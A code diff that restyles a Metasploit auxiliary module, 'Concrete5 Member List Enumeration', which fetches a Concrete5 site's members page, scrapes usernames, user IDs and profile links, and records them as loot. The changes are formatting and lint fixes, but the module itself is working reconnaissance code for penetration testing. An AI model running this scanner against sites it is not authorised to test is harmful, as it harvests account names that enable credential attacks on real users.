@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
@@ -14,9 +14,9 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name'         => 'Concrete5 Member List Enumeration',
-      'Description'  => %q{
+      'Description'  => %q(
         This module extracts username information from the Concrete5 member page
-        },
+        ),
       'References'   =>
         [
           # General
@@ -33,28 +33,29 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(80),
         OptString.new('URI', [false, 'URL of the Concrete5 root', '/'])
-      ], self.class)
+      ], self.class
+    )
     deregister_options('RHOST')
   end
 
-  def run_host(rhost)
+  def run_host(_rhost)
     url = normalize_uri(datastore['URI'], '/index.php/members')
 
     begin
-      res = send_request_raw({'uri' => url})
+      res = send_request_raw('uri' => url)
 
     rescue ::Rex::ConnectionError
       print_error("#{peer} Unable to connect to #{url}")
       return
     end
 
-    if not res
+    unless res
       print_error("#{peer} Unable to connect to #{url}")
       return
     end
 
     # extract member info from response if present
-    if res and res.body =~ /ccm\-profile\-member\-username/i
+    if res && res.body =~ /ccm\-profile\-member\-username/i
       extract_members(res, url)
     elsif res
       print_line(res.body)
@@ -62,20 +63,21 @@ class MetasploitModule < Msf::Auxiliary
     else
       print_error("#{peer} No response received")
     end
-
   end
 
-  def extract_members(res, url)
+  def extract_members(res, _url)
     members = res.get_html_document.search('div[@class="ccm-profile-member-username"]')
 
-    unless members.empty?
+    if members.empty?
+      print_error("#{peer} Unable to extract members")
+    else
       print_good("#{peer} Extracted #{members.length} entries")
 
       # separate user data into userID, username and Profile URL
       memberlist = []
       users = []
 
-      members.each do | mem |
+      members.each do |mem|
         userid = mem.text.scan(/\/view\/(\d+)/i).flatten.first
         anchor = mem.at('a')
         username = anchor.text
@@ -88,19 +90,20 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       membertbl = Msf::Ui::Console::Table.new(
-            Msf::Ui::Console::Table::Style::Default, {
-            'Header'    => "Concrete5 members",
-            'Prefix'  => "\n",
-            'Postfix' => "\n",
-            'Indent'    => 1,
-            'Columns'   =>
+        Msf::Ui::Console::Table::Style::Default, 'Header' => "Concrete5 members",
+                                                 'Prefix'  => "\n",
+                                                 'Postfix' => "\n",
+                                                 'Indent'    => 1,
+                                                 'Columns'   =>
             [
               "UserID",
               "Username",
               "Profile"
-            ]})
+            ]
 
-      memberlist.each do | mem |
+      )
+
+      memberlist.each do |mem|
         membertbl << [mem[0], mem[1], mem[2]]
       end
 
@@ -108,16 +111,12 @@ class MetasploitModule < Msf::Auxiliary
       print_line(membertbl.to_s)
 
       # store username to loot
-      report_note({
-        :host => rhost,
-        :port => rport,
-        :proto => 'tcp',
-        :type => "concrete5 CMS members",
-        :data => {:proto => "http", :users => users.join(",")}
-      })
+      report_note(host: rhost,
+                  port: rport,
+                  proto: 'tcp',
+                  type: "concrete5 CMS members",
+                  data: { proto: "http", users: users.join(",") })
 
-    else
-      print_error("#{peer} Unable to extract members")
     end
   end
 end
